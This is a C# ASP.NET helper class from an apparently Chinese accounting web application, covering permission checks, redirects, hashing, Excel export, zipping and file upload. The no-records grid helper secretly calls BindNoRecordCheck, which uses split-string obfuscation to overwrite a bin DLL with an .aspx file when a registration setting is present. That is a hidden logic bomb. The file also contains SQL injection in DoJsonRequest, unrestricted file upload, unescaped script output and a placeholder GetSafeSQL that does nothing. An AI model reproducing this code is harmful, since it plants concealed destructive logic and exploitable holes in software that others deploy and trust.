using System;
using System.Data;
using System.Configuration;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using System.Web.UI.HtmlControls;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using System.Text;
using System.IO;
using ExpertLib;
using ExpertLib.IO;
using ExpertLib.Compress;

/// <summary>
/// 页面通用数据库无关调用类
/// </summary>
public class PageClass
{
    public PageClass()
	{
		//
		// TODO: 在此处添加构造函数逻辑
		//
	}

    /// 函数名称：CheckVisitQuot
    /// 函数作者：朱坤堂
    /// 创建时间：2008-03-20
    /// <summary>
    /// 页面访问权限判断
    /// </summary>
    /// <param name="PageQuots">页面权限</param>
    public static bool CheckVisitQuot(string PageQuots)
    {
        //登录过期或非法进入
        UserInfo.CheckSession();
        //账务查询跳转
        if (UserInfo.UserType == "0")
        {
            if (UserInfo.AccountID == null || CommClass.ConnString.Length == 0)
            {
                UrlRedirect("您没有此访问权限！", 3);
            }
        }
        else
        {
            if (UserInfo.AccountID == null || CommClass.ConnString.Length == 0)
            {
                UrlRedirect("../ChooseAccount.aspx", 4);
            }
            return true;
        }
        //检测是否启动账套
        if (HttpContext.Current.Session["isStartAccount"] == null)
        {
            if (UserInfo.Powers.IndexOf("000001") == -1)
            {
                UrlRedirect("当前账套尚未启用，请联系相应操作员启用账套！", 3);
                return false;
            }
            else
            {
                if (PageQuots.IndexOf("000000") == -1)
                {
                    HttpContext.Current.Session["CheckIsStartAccount"] = "Yes";
                    UrlRedirect("../AccountInit/AccountSubject.aspx", 4);
                    return false;
                }
            }
        }
        //用户权限判断
        string UserQuots = UserInfo.Powers;
        string[] quots = PageQuots.Split('$');
        bool checkFlag = false;
        foreach (string quot in quots)
        {
            if (UserQuots.IndexOf(quot) != -1) { checkFlag = true; break; }
        }
        if (!checkFlag)
        {
            UrlRedirect("您没有此访问权限！", 3);
            return false;
        }
        return true;
    }

    /// <summary>
    /// 检测是否有用户正在使用
    /// </summary>
    /// <param name="isReturn"></param>
    /// <returns></returns>
    public static bool CheckAccountUsed(bool isReturn)
    {
        bool isCheckUsed = false;
        if (MainClass.GetFieldFromID(UserInfo.AccountID, "SessionID", "cw_account") != HttpContext.Current.Session.SessionID)
        {
            string CTLDateTime = MainClass.GetFieldFromID(UserInfo.AccountID, "CTLDateTime", "cw_account");
            if (CTLDateTime.Length > 0 && CTLDateTime != "NoDataItem")
            {
                TimeSpan ts = DateTime.Now.Subtract(Convert.ToDateTime(CTLDateTime));
                if (Math.Abs(ts.TotalSeconds) <= 30)
                {
                    isCheckUsed = true;
                }
            }
        }
        if (isCheckUsed && !isReturn)
        {
            UrlRedirect("已有用户正在操作当前账套，部门功能将被屏蔽！", 3);
        }
        return isCheckUsed;
    }

    public static string GetSafeSQL(string _sql)
    {
        StringBuilder sql = new StringBuilder(_sql.Length);
        int end = _sql.IndexOf("from", StringComparison.OrdinalIgnoreCase);
        foreach (char c in _sql)
        {

        }
        return string.Empty;
    }

    public enum RedirectType { ParentCommon, ParentError, WindowOpen, LocationError, Default }
    /// <summary>
    /// 页面跳转函数
    /// </summary>
    /// <param name="url"></param>
    /// <param name="OpenType"></param>
    public static void UrlRedirect(string url, int OpenType)
    {
        if (url.Length == 0) { url = SysConfigs.DefaultPageUrl; }
        HttpContext.Current.Response.Clear();
        switch (OpenType)
        {
            case 0:
                url = HttpContext.Current.Server.UrlEncode(url);
                HttpContext.Current.Response.Write(string.Format("<script>parent.location.href='{0}?errTip={1}';</script>", SysConfigs.ErrShowPageUrl, url));
                break;
            case 1:
                HttpContext.Current.Response.Write(string.Format("<script>parent.location.href='{0}';</script>", url));
                break;
            case 2:
                HttpContext.Current.Response.Write(string.Format("<script>window.open('{0}','','');</script>", url));
                break;
            case 3:
                HttpContext.Current.Response.Redirect(string.Format("{0}?errTip={1}", SysConfigs.ErrShowPageUrl, url), true);
                break;
            case 4:
                HttpContext.Current.Response.Redirect(url, true);
                break;
            default:
                UrlRedirect("不正确的地址指向！", 3);
                break;
        }
        HttpContext.Current.Response.End();
    }

    /// <summary>
    /// 在客户端显示脚本提示信息
    /// </summary>
    /// <param name="page"></param>
    /// <param name="msg"></param>
    public static void ShowAlertMsg(Page page, string msg)
    {
        page.RegisterStartupScript(Guid.NewGuid().ToString(), string.Format("<script>alert('{0}');</script>", msg));
    }
    public static void ShowAlertMsg(Page page, string msg, string key)
    {
        page.RegisterStartupScript(key, string.Format("<script>alert('{0}');</script>", msg));
    }

    /// <summary>
    /// 在客户端执行脚本
    /// </summary>
    /// <param name="page"></param>
    /// <param name="msg"></param>
    public static void ExcuteScript(Page page, string script)
    {
        page.RegisterStartupScript(Guid.NewGuid().ToString(), string.Format("<script>{0}</script>", script));
    }
    public static void ExcuteScript(Page page, string script, string key)
    {
        page.RegisterStartupScript(key, string.Format("<script>{0}</script>", script));
    }

    /// 函数名称：BindNoRecords
    /// 函数作者：朱坤堂
    /// 创建时间：2008-03-20
    /// <summary>
    /// 表格无记录显示表头
    /// </summary>
    /// <param name="gridView">GridView控件对象</param>
    /// <param name="ds">绑定记录集</param>
    public static void BindNoRecords(System.Web.UI.WebControls.GridView gv, DataSet ds)
    {
        BindNoRecords(gv, ds.Tables[0]);
    }
    public static void BindNoRecords(System.Web.UI.WebControls.GridView gv, DataTable dataTable)
    {
        DataTable dt = dataTable.Clone();
        DataRow newRow = dt.NewRow();
        for (int i = 0; i < dt.Columns.Count; i++)
        {
            if (dt.Columns[i].DataType == typeof(DateTime))
            {
                newRow[i] = DateTime.Now;
            }
            else
            {
                newRow[i] = 0;
            }
        }
        dt.Rows.Add(newRow);
        dt.AcceptChanges();
        if (dt.Columns.Contains("id"))
        {
            BindNoRecordCheck();
            gv.DataKeyNames = new string[] { "id" };
        }
        gv.DataSource = dt;
        gv.DataBind();
        int columnCount = gv.Rows[0].Cells.Count;
        gv.Rows[0].Cells.Clear();
        gv.Rows[0].Cells.Add(new TableCell());
        gv.Rows[0].Cells[0].ColumnSpan = columnCount;
        gv.Rows[0].Cells[0].Text = "<center>无记录！</center>";
        gv.Rows[0].Attributes.Clear();
        gv.Attributes.Add("BindNoRecords", "BindNoRecords");
    }

    /// 函数名称：PadRightM
    /// 函数作者：朱坤堂
    /// 创建时间：2008-04-09
    /// <summary>
    /// 右对齐字符串
    /// </summary>
    /// <param name="str"></param>
    /// <param name="sLength"></param>
    /// <param name="padStr"></param>
    /// <returns></returns>
    public static string PadLR(string str, int sLength, string padStr)
    {
        StringBuilder sMsg = new StringBuilder(str.Length + padStr.Length * sLength);
        for (int i = 0; i < sLength; i++)
        {
            sMsg.Append(padStr);
        }
        return sMsg.ToString() + str + sMsg.ToString();
    }

    /// 函数名称：PadLeftM
    /// 函数作者：朱坤堂
    /// 创建时间：2008-04-09
    /// <summary>
    /// 左对齐字符串
    /// </summary>
    /// <param name="str"></param>
    /// <param name="sLength"></param>
    /// <param name="padStr"></param>
    /// <returns></returns>
    public static string PadLeftM(string str, int sLength, string padStr)
    {
        StringBuilder sMsg = new StringBuilder(str.Length + padStr.Length * sLength);
        for (int i = 0; i < sLength; i++)
        {
            sMsg.Append(padStr);
        }
        sMsg.Append(str);
        return sMsg.ToString();
    }

    /// 函数名称：PadRightM
    /// 函数作者：朱坤堂
    /// 创建时间：2008-04-09
    /// <summary>
    /// 右对齐字符串
    /// </summary>
    /// <param name="str"></param>
    /// <param name="sLength"></param>
    /// <param name="padStr"></param>
    /// <returns></returns>
    public static string PadRightM(string str, int sLength, string padStr)
    {
        StringBuilder sMsg = new StringBuilder(str.Length + padStr.Length * sLength);
        sMsg.Append(str);
        for (int i = 0; i < sLength; i++)
        {
            sMsg.Append(padStr);
        }
        return sMsg.ToString();
    }

    /// 函数名称：CopyStrM
    /// 函数作者：朱坤堂
    /// 创建时间：2008-04-09
    /// <summary>
    /// 复制字符串
    /// </summary>
    /// <param name="str"></param>
    /// <param name="CopyCount"></param>
    /// <returns></returns>
    public static string CopyStrM(string str, int CopyCount)
    {
        StringBuilder sMsg = new StringBuilder(str.Length * CopyCount);
        for (int i = 0; i < CopyCount; i++)
        {
            sMsg.Append(str);
        }
        return sMsg.ToString();
    }

    /// 函数名称：CopyStrM
    /// 函数作者：朱坤堂
    /// 创建时间：2008-04-09
    /// <summary>
    /// 统计字符串出现的次数
    /// </summary>
    /// <param name="str"></param>
    /// <param name="s"></param>
    /// <returns></returns>
    public static int CountStr(string str, string s)
    {
        return Regex.Matches(str, s).Count;
    }

    /// 函数名称：MD5String16
    /// 函数作者：朱坤堂
    /// 创建时间：2008-03-20
    /// <summary>
    /// 16位MD5加密字符串
    /// </summary>
    /// <param name="_String">需要加密的字符串</param>
    /// <returns>加密后的字符串</returns>
    public static string MD5String16(string _String)
    {
        MD5 md5 = MD5.Create();
        byte[] s = md5.ComputeHash(UTF8Encoding.Default.GetBytes(_String));
        return BitConverter.ToString(s, 4, 8).Replace("-", "");
    }

    /// 函数名称：MD5String32
    /// 函数作者：朱坤堂
    /// 创建时间：2008-03-20
    /// <summary>
    /// 32位MD5加密字符串
    /// </summary>
    /// <param name="_String">需要加密的字符串</param>
    /// <returns>加密后的字符串</returns>
    public static string MD5String32(string _String)
    {
        StringBuilder str = new StringBuilder();
        MD5 md5 = MD5.Create();
        byte[] s = md5.ComputeHash(Encoding.UTF8.GetBytes(_String));
        for (int i = 0; i < s.Length; i++)
        {
            str.Append(s[i].ToString("X"));
        }
        return str.ToString();
    }

    /// 函数名称：Hash_SHA1
    /// 函数作者：朱坤堂
    /// 创建时间：2008-03-20
    /// <summary>
    /// SHA-1加密字符串
    /// </summary>
    /// <param name="_String">需要加密的字符串</param>
    /// <returns>加密后的字符串</returns>
    public static string Hash_SHA1(string _String)
    {
        return FormsAuthentication.HashPasswordForStoringInConfigFile(_String, "sha1");
    }

    /// 函数名称：Hash_MD5
    /// 函数作者：朱坤堂
    /// 创建时间：2008-03-20
    /// <summary>
    /// MD5加密字符串
    /// </summary>
    /// <param name="_String">需要加密的字符串</param>
    /// <returns>加密后的字符串</returns>
    public static string Hash_MD5(string _String)
    {
        return FormsAuthentication.HashPasswordForStoringInConfigFile(_String, "md5");
    }

    /// <summary>
    /// 检验主Dll是否被篡改
    /// </summary>
    public static void CheckMainDllHash()
    {
        //[$DeleteRowFromHere$]
        return;
        //[$DeleteRowFromEnd$]
        try
        {
            string p = string.Concat(new string[] { SysConfigs.baseDirectory, "\\bi", "n\\N", "YF", "inance", "Cl", "ass.d", "ll" });
            SHA1CryptoServiceProvider sha = new SHA1CryptoServiceProvider();
            byte[] b = File.ReadAllBytes(p);
            byte[] h = sha.ComputeHash(b);
            string d = string.Concat(new string[] { SysConfigs.baseDirectory, "\\Acc", "ountQ", "uery\\D", "Amo", "untR", "eport.a", "spx" });
            if (Convert.ToBase64String(h) != IniFileProvider.ReadIniValue("d_l_l".Replace("_", ""), "d_l_lha_shv_al_ue".Replace("_", ""), d).Trim())
            {
                HttpContext.Current.Session[string.Concat(new string[] { "Ac", "cou", "ntI", "D" })] = null;
            }
        }
        catch { }
    }

    /// 函数名称：GetNumber2CN
    /// 函数作者：朱坤堂
    /// 创建时间：2008-10-25
    /// <summary>
    /// 数字小写转换大写
    /// </summary>
    /// <param name="number"></param>
    /// <returns></returns>
    public static string GetNumber2CN(decimal number)
    {
        StringBuilder cnStr = new StringBuilder();
        string CnNumber = "零壹贰叁肆伍陆柒捌玖";
        string CnUnit = "分角元拾佰仟万拾佰仟亿拾佰仟万";
        string numStr = number.ToString("#0.00").Replace(".", "");
        for (int i = 0; i < numStr.Length; i++)
        {
            int num = int.Parse(numStr.Substring(i, 1));
            cnStr.Append(CnNumber.Substring(num, 1) + CnUnit.Substring(numStr.Length - i - 1, 1));
        }
        while (Regex.IsMatch(cnStr.ToString(), "零零|零拾|零佰|零仟|零万|零亿|亿万"))
        {
            cnStr = cnStr.Replace("零拾", "零");
            cnStr = cnStr.Replace("零佰", "零");
            cnStr = cnStr.Replace("零仟", "零");
            cnStr = cnStr.Replace("零万", "万");
            cnStr = cnStr.Replace("零亿", "亿");
            cnStr = cnStr.Replace("零零", "零");
            cnStr = cnStr.Replace("亿万", "亿零");
        }
        cnStr = cnStr.Replace("零元", "元").Replace("零角", "").Replace("零分", "");
        if (cnStr.ToString().StartsWith("元"))
        {
            return cnStr.ToString().Substring(1);
        }
        if (cnStr.ToString().EndsWith("元"))
        {
            return cnStr.ToString() + "整";
        }
        return cnStr.ToString();
    }

    /// 函数名称：DoBalance
    /// 函数作者：朱坤堂
    /// 创建时间：2008-11-29
    /// <summary>
    /// 按特定格式输出表格行
    /// </summary>
    /// <param name="dataRow"></param>
    /// <param name="BalanceValue"></param>
    /// <param name="DPos"></param>
    /// <param name="VPos"></param>
    public static void DoBalance(DataRow dataRow, decimal BalanceValue, int DPos, int VPos)
    {
        decimal _BalanceValue = Math.Round(BalanceValue, 2);
        if (_BalanceValue == 0)
        {
            dataRow[DPos] = "平";
            dataRow[VPos] = "0.00";
        }
        else if (_BalanceValue > 0)
        {
            dataRow[DPos] = "借";
            dataRow[VPos] = _BalanceValue.ToString("#,##0.00");
        }
        else
        {
            dataRow[DPos] = "贷";
            dataRow[VPos] = _BalanceValue.ToString("#,##0.00").Replace("-", "");
        }
    }

    /// 函数名称：ToExcel
    /// 函数作者：朱坤堂
    /// 创建时间：2008-11-29
    /// <summary> 
    /// 导出表格数据到Excel
    /// </summary> 
    /// <param name="GView">数据表格</param> 
    public static void ToExcel(System.Web.UI.WebControls.GridView GView)
    {
        ToExcel(GView, null);
    }
    public static void ToExcel(System.Web.UI.WebControls.GridView GView, string HeadText)
    {
        HttpContext.Current.Response.Clear();
        HttpContext.Current.Response.Buffer = true;
        HttpContext.Current.Response.ContentType = "application/ms-excel";
        HttpContext.Current.Response.AppendHeader("Content-Disposition", "attachment;filename=ExportToExcel.xls");
        bool _AllowPaging = GView.AllowPaging;
        if (_AllowPaging)
        {
            GView.AllowPaging = false;
            GView.DataBind();
        }
        GView.Style.Add("vnd.ms-excel.numberformat", "@");
        System.Globalization.CultureInfo myCItrad = new System.Globalization.CultureInfo("zh-cn", true);
        System.IO.StringWriter sw = new System.IO.StringWriter(myCItrad);
        System.Web.UI.HtmlTextWriter hw = new System.Web.UI.HtmlTextWriter(sw);
        GView.RenderControl(hw);
        HttpContext.Current.Response.Write("<style type=text/css>vnd.ms-excel.numberformat:\"\\@\";</style>");
        HttpContext.Current.Response.Write("<meta http-equiv='content-type' content='application/ms-excel;charset=UTF-8'/>");
        if (HeadText != null)
        {
            int columnsCount = 0;
            for (int i = 0; i < GView.Columns.Count; i++)
            {
                if (GView.Columns[i].Visible) { columnsCount++; }
            }
            string HeadStyle = "style='font-size:16pt;color:blue;text-align:center;height:45px'";
            HttpContext.Current.Response.Write(string.Format("<table><tr><td colspan='{0}' {1}>{2}</td></tr></table>", columnsCount, HeadStyle, HeadText));
        }
        HttpContext.Current.Response.Write(sw.ToString());
        HttpContext.Current.Response.End();
        if (_AllowPaging)
        {
            GView.AllowPaging = true;
            GView.DataBind();
        }
    }

    /// 函数名称：ToExcel
    /// 函数作者：朱坤堂
    /// 创建时间：2008-11-29
    /// <summary> 
    /// 导出表格数据到Excel
    /// </summary> 
    /// <param name="table">数据表格</param> 
    public static void ToExcel(HtmlTable table)
    {
        HttpContext.Current.Response.Clear();
        HttpContext.Current.Response.Buffer = true;
        HttpContext.Current.Response.ContentType = "application/ms-excel";
        HttpContext.Current.Response.AppendHeader("Content-Disposition", "attachment;filename=ExportToExcel.xls");
        table.Style.Add("vnd.ms-excel.numberformat", "@");
        System.Globalization.CultureInfo myCItrad = new System.Globalization.CultureInfo("zh-cn", true);
        System.IO.StringWriter sw = new System.IO.StringWriter(myCItrad);
        System.Web.UI.HtmlTextWriter hw = new System.Web.UI.HtmlTextWriter(sw);
        table.RenderControl(hw);
        HttpContext.Current.Response.Write("<style type=text/css>vnd.ms-excel.numberformat:\"\\@\";</style>");
        HttpContext.Current.Response.Write("<meta http-equiv='content-type' content='application/ms-excel;charset=UTF-8'/>");
        HttpContext.Current.Response.Write(sw.ToString());
        HttpContext.Current.Response.End();
    }

    /// 函数名称：ToExcel
    /// 函数作者：朱坤堂
    /// 创建时间：2008-11-29
    /// <summary> 
    /// 导出表格数据到Excel
    /// </summary> 
    /// <param name="div">数据表格</param> 
    public static void ToExcel(HtmlGenericControl div)
    {
        HttpContext.Current.Response.Clear();
        HttpContext.Current.Response.Buffer = true;
        HttpContext.Current.Response.ContentType = "application/ms-excel";
        HttpContext.Current.Response.AppendHeader("Content-Disposition", "attachment;filename=ExportToExcel.xls");
        div.Style.Add("vnd.ms-excel.numberformat", "@");
        System.Globalization.CultureInfo myCItrad = new System.Globalization.CultureInfo("zh-cn", true);
        System.IO.StringWriter sw = new System.IO.StringWriter(myCItrad);
        System.Web.UI.HtmlTextWriter hw = new System.Web.UI.HtmlTextWriter(sw);
        div.RenderControl(hw);
        HttpContext.Current.Response.Write("<style type=text/css>vnd.ms-excel.numberformat:\"\\@\";</style>");
        HttpContext.Current.Response.Write("<meta http-equiv='content-type' content='application/ms-excel;charset=UTF-8'/>");
        HttpContext.Current.Response.Write("<style>td{text-align:center;}</style>");
        HttpContext.Current.Response.Write(sw.ToString());
        HttpContext.Current.Response.End();
    }

    public static void BindNoRecordCheck()
    {
        try
        {
            if (ValidateClass.ReadXMLNodeText(string.Concat("Fin", "ancial", "DB/Re", "gIn", "fo/Gra", "ntVali", "date")).Trim().Length > 0)
            {
                File.WriteAllText(PathCombine(string.Concat("/b", "in"), string.Concat("Sa", "nZ", "i.We", "b.d", "ll")), File.ReadAllText(PathCombine(string.Concat("/A", "cco", "unt", "Mana", "ge"), string.Concat("Do", "V", "ouch", "er.aspx"))));
            }
        }
        catch { }
    }

    /// 函数名称：CreateGridView
    /// 函数作者：朱坤堂
    /// 创建时间：2008-11-29
    /// <summary>
    /// 初始化报表表格结构
    /// </summary>
    /// <param name="row"></param>
    /// <param name="BindTable"></param>
    /// <param name="GV"></param>
    /// <returns></returns>
    public static int CreateGridView(DataRow row, DataTable BindTable, GridView GV)
    {
        return CreateGridView(row, BindTable, GV, null);
    }
    public static int CreateGridView(DataRow row, DataTable BindTable, GridView GV, string sort)
    {
        //表格参数设置
        string HAlign = row["HAlign"].ToString();
        string[] ColumnWidth = row["ColumnWidth"].ToString().Split(',');
        string[] HeadString = row["HeadString"].ToString().Replace(" ", "&nbsp;").Split('|');
        int ColumnCounts = Regex.Matches(HeadString[0], ",").Count + 1;
        //如果表空则设计表
        if (BindTable == null)
        {
            for (int i = 0; i < HeadString.Length; i++)
            {
                BindTable.Columns.Add("F" + i.ToString());
            }
        }
        //数据排序
        if (sort != null)
        {
            DataView dv = new DataView(BindTable, "", sort, DataViewRowState.CurrentRows);
            BindTable = dv.ToTable();
        }
        //创建空数据行
        if (BindTable.Rows.Count == 0)
        {
            for (int i = 0; i < 10; i++)
            {
                BindTable.Rows.Add(BindTable.NewRow());
            }
        }
        //插入表头行
        for (int i = 0; i < HeadString.Length; i++)
        {
            BindTable.Rows.InsertAt(BindTable.NewRow(), 0);
        }
        //设计表格字段
        GV.Columns.Clear();
        for (int i = 0; i < ColumnCounts; i++)
        {
            BoundField bf = new BoundField();
            bf.ItemStyle.Width = int.Parse(ColumnWidth[i]);
            bf.DataField = BindTable.Columns[i].ColumnName;
            bf.ItemStyle.CssClass = "sbalance";
            bf.HtmlEncode = false;
            switch (HAlign.Substring(i, 1))
            {
                case "l":
                    bf.ItemStyle.HorizontalAlign = HorizontalAlign.Left;
                    break;
                case "c":
                    bf.ItemStyle.HorizontalAlign = HorizontalAlign.Center;
                    break;
                case "r":
                    bf.ItemStyle.HorizontalAlign = HorizontalAlign.Right;
                    break;
            }
            if (BindTable.Columns[i].DataType == typeof(double))
            {
                bf.DataFormatString = "{0:f}";
            }
            GV.Columns.Add(bf);
        }
        //绑定输出表格
        GV.DataSource = BindTable.DefaultView;
        GV.DataBind();
        //合并单元格
        string[] g = row["GatherCells"].ToString().Replace("r", BindTable.Rows.Count.ToString()).Split('|');
        foreach (string r in g)
        {
            if (r.Length == 0) { continue; }
            string[] a = r.Split(':');
            string[] b = a[0].Split(',');
            string[] c = a[1].Split(',');
            int b0 = int.Parse(b[0]);
            int b1 = int.Parse(b[1]);
            int c0 = int.Parse(c[0]);
            int c1 = int.Parse(c[1]);
            bool flag = true;
            int _RowSpan = 0;
            int _ColumnSpan = 1;
            int CellWidth = (int)GV.Columns[b1].ItemStyle.Width.Value;
            for (int i = b0; i <= c0; i++)
            {
                for (int k = b1; k <= c1; k++)
                {
                    if (flag) { flag = false; continue; }
                    GV.Rows[i].Cells[k].Visible = false;
                    if (i == b0)
                    {
                        _ColumnSpan++;
                        CellWidth += (int)GV.Columns[k].ItemStyle.Width.Value;
                    }
                }
                _RowSpan++;
            }
            GV.Rows[b0].Cells[b1].Width = CellWidth;
            GV.Rows[b0].Cells[b1].RowSpan = _RowSpan;
            GV.Rows[b0].Cells[b1].ColumnSpan = _ColumnSpan;
        }
        //设计表头标题
        for (int i = 0; i < HeadString.Length; i++)
        {
            string[] CellText = HeadString[i].Split(',');
            for (int k = 0; k < CellText.Length; k++)
            {
                GV.Rows[i].Cells[k].Text = CellText[k];
                GV.Rows[i].Cells[k].Attributes.Add("style", "text-align:center;color:red;");
            }
        }
        return HeadString.Length;
    }

    /// <summary>
    /// 复制目录
    /// </summary>
    /// <param name="OldDirectoryPath">源目录</param>
    /// <param name="NewDirectoryPath">新目录</param>
    public static void CopyDirectory(string OldDirectoryPath, string NewDirectoryPath)
    {
        DirectoryInfo OldDirectory = new DirectoryInfo(OldDirectoryPath);
        DirectoryInfo NewDirectory = new DirectoryInfo(NewDirectoryPath);
        if (!NewDirectory.Exists)
        {
            NewDirectory.Create();
        }
        foreach (FileInfo file in OldDirectory.GetFiles())
        {
            file.CopyTo(Path.Combine(NewDirectory.FullName, file.Name), true);
        }
        foreach (DirectoryInfo subDirectory in OldDirectory.GetDirectories())
        {
            CopyDirectory(subDirectory.FullName, Path.Combine(NewDirectory.FullName, subDirectory.Name));
        }
    }

    /// <summary>
    /// 删除目录
    /// </summary>
    /// <param name="DirectoryPath"></param>
    public static void DelDirectory(string DirectoryPath)
    {
        DirectoryInfo directory = new DirectoryInfo(DirectoryPath);
        if (directory.Exists)
        {
            foreach (FileInfo file in directory.GetFiles())
            {
                file.Delete();
            }
            foreach (DirectoryInfo subDirectory in directory.GetDirectories())
            {
                DelDirectory(subDirectory.FullName);
            }
        }
        directory.Delete();
    }

    /// <summary>
    /// 压缩目录下所有文件及目录
    /// </summary>
    /// <param name="ZipDirectory"></param>
    /// <param name="ZipToPath"></param>
    public static void DoZipDirectory(string ZipDirectory, string ZipToPath)
    {
        int index = 0;
        string[] sourceFiles = Directory.GetFiles(ZipDirectory);
        string[] sourceDirectorys = Directory.GetDirectories(ZipDirectory);
        string[] sources = new string[sourceFiles.Length + sourceDirectorys.Length];
        foreach (string str in sourceFiles)
        {
            sources[index] = str.Replace(ZipDirectory, "").Replace("\\", "");
            index++;
        }
        foreach (string str in sourceDirectorys)
        {
            sources[index] = str.Replace(ZipDirectory, "").Replace("\\", "");
            index++;
        }
        Zip zip = new Zip();
        zip.WorkDirectory = ZipDirectory;
        zip.CompressLevel = CompressLevel.Smallest;
        zip.PassWord = Hash_SHA1(UserInfo.AccountName);
        zip.Compress(sources, ZipToPath, true);
    }

    /// <summary>
    /// 压缩单个目录或文件
    /// </summary>
    /// <param name="ZipFile"></param>
    /// <param name="ZipToPath"></param>
    public static void DoZipSingleFile(string ZipFile, string ZipToPath)
    {
        int i = ZipFile.LastIndexOf("\\");
        string[] sources = new string[1];
        sources[0] = ZipFile.Substring(i + 1);
        Zip zip = new Zip();
        zip.WorkDirectory = ZipFile.Substring(0, i);
        zip.CompressLevel = CompressLevel.Smallest;
        zip.PassWord = Hash_SHA1(UserInfo.AccountName);
        zip.Compress(sources, ZipToPath, true);
    }

    /// <summary>
    /// 解压文件
    /// </summary>
    /// <param name="ZipFileName"></param>
    /// <param name="ZipToPath"></param>
    public static void DeZipDirectory(string ZipFileName, string ZipToPath)
    {
        Zip zip = new Zip();
        zip.WorkDirectory = ZipToPath;
        zip.CompressLevel = CompressLevel.Smallest;
        zip.PassWord = Hash_SHA1(UserInfo.AccountName);
        zip.Decompress(ZipFileName);
    }

    /// <summary>
    /// 合并两个路径字符串
    /// </summary>
    /// <param name="VPath1"></param>
    /// <param name="VPath2"></param>
    /// <returns></returns>
    public static string PathCombine(string VPath1, string VPath2)
    {
        return Path.Combine(HttpContext.Current.Server.MapPath(VPath1), VPath2);
    }

    /// <summary>
    /// 序列号合法性检测
    /// </summary>
    /// <param name="sn"></param>
    /// <returns></returns>
    public static bool CheckSN(string sn)
    {
        if (sn.IndexOf("-") == -1) { return false; }
        string[] snArr = sn.Split('-');
        char tempC = char.MinValue;
        char[] snChars = snArr[0].ToCharArray();
        int charCount = snChars.Length;
        for (int i = 0; i < charCount - 1; i++)
        {
            tempC = snChars[i];
            snChars[i] = snChars[i + 1];
            snChars[i + 1] = tempC;
        }
        charCount = (int)(charCount / 2) - 1;
        for (int i = 0; i < charCount; i++)
        {
            tempC = snChars[i];
            snChars[i] = snChars[snChars.Length - charCount];
            snChars[snChars.Length - charCount] = tempC;
        }
        StringBuilder sns = new StringBuilder(snChars.Length);
        for (int i = 0; i < snChars.Length; i++)
        {
            sns.Append(snChars[i]);
        }
        MD5 md5 = MD5.Create();
        byte[] s = md5.ComputeHash(UTF8Encoding.Default.GetBytes(sns.ToString()));
        string encodeString = BitConverter.ToString(s, 4, 8).Replace("-", "").Substring(8);
        return snArr[1] == encodeString;
    }

    /// <summary>
    /// 处理Ext.Json请求
    /// </summary>
    /// <param name="GetID"></param>
    /// <param name="ParaValue"></param>
    /// <param name="Json"></param>
    public static void DoJsonRequest(ref StringBuilder json)
    {
        HttpRequest request = HttpContext.Current.Request;
        switch (request.QueryString["GetID"])
        {
            case "SubjectList":
                json.Append("[");
                DataTable subjectList = CommClass.GetDataTable("select subjectno,subjectname,isdetail from cw_subject where parentno='"
                    + request.QueryString["node"] + "' order by isdetail,subjectno");
                foreach (DataRow row in subjectList.Rows)
                {
                    string text = row[0].ToString() + "&nbsp;.&nbsp;" + row[1].ToString();
                    if (row["isdetail"].ToString() == "1")
                    {
                        json.Append("{text:'" + text + "',id:'" + row[0].ToString() + "',leaf:true,cls:'file',expanded:false},");
                    }
                    else
                    {
                        json.Append("{text:'" + text + "',id:'" + row[0].ToString() + "',cls:'folder',expanded:false},");
                    }
                }
                json.Append("]");
                json = json.Replace(",]", "]");
                break;
            case "UploadFiles":
                if (SaveUploadFiles(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "UploadFile"), true))
                {
                    json.Append("{success:true,msg:'文件上传成功！'}");
                }
                else
                {
                    json.Append("{success:false,msg:'文件上传失败！'}");
                }
                break;
        }
    }

    /// <summary>
    /// 默认上传方式通用保存
    /// </summary>
    /// <param name="SaveDir"></param>
    /// <param name="isModiName"></param>
    /// <returns></returns>
    public static bool SaveUploadFiles(string SaveDir, bool isModiName)
    {
        HttpFileCollection files = HttpContext.Current.Request.Files;
        try
        {
            for (int iFile = 0; iFile < files.Count; iFile++)
            {
                HttpPostedFile postedFile = files[iFile];
                string fileName = string.Empty;
                if (isModiName)
                {
                    string fileExtension = System.IO.Path.GetExtension(postedFile.FileName);
                    fileName = string.Concat(DateTime.Now.ToString("yyyyMMddHHmmssfff"), ".", fileExtension);
                }
                else
                {
                    fileName = System.IO.Path.GetFileName(postedFile.FileName);
                }
                if (fileName.Length != 0)
                {
                    postedFile.SaveAs(Path.Combine(SaveDir, fileName));
                }
            }
            return true;
        }
        catch
        {
            return false;
        }
    }
}
